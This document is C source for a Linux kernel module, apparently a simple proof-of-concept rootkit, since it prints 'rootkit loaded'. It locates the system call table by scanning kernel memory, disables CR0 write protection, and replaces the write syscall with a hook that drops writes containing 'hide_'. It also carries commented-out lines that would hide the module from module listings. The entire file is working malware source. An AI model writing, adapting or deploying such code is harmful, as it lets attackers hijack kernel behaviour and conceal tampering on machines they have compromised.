#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

MODULE_LICENSE("Dual BSD/GPL");
int _init(void);
void _eexit(void);
module_init(_init);
module_exit(_eexit);

#if defined(__i386__)
#define START 0xc0000000
#define END 0xd0000000
typedef unsigned int my_type;
#else
#define START 0xffffffff81000000
#define END 0xffffffffa2000000
typedef unsigned long my_type;
#endif


my_type **find(void)
{
    my_type **table;
    my_type start = START;
    my_type end = END;
    while (start < end)
    {
        table = (my_type **) start;
        if (table[__NR_close] == (my_type *) sys_close)
            return &table[0];
        start += sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t (*o_write)(int fd, const void *buff, ssize_t count);

asmlinkage ssize_t my_write(int fd, const void *buff, ssize_t count)
{
    int r;
    char *proc_protect = "hide_";
    char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
    copy_from_user(kbuff,buff,255);
    if (strstr(kbuff,proc_protect)) {
        kfree(kbuff);
        return EEXIST;
    }
    r = (*o_write)(fd,buff,count);
    kfree(kbuff);
    return r;
}

int _init(void) {
    my_type* syscalltable = 0;
    printk("rootkit loaded\n");
    /*list_del_init(&__this_module.list);*/      /* /proc/modules */
    /*kobject_del(&THIS_MODULE->mkobj.kobj);*/   /* /sys/modules  */
    syscalltable = (my_type* ) find();
    if (syscalltable != 0)
    {
        write_cr0(read_cr0() & (~ 0x10000));
        o_write = (void *) xchg(&syscalltable[__NR_write], my_write);
        printk("rootkit replaced write\n");
        write_cr0(read_cr0() | 0x10000);
    }
    return 0;
}

void _eexit(void) {
    my_type* syscalltable = 0;
    syscalltable = (my_type* ) find();
    if (syscalltable != 0)
    {
        write_cr0(read_cr0() & (~ 0x10000));
        xchg(&syscalltable[__NR_write], o_write);
        write_cr0(read_cr0() | 0x10000);
    }
    printk("rootkit removed\n");
}
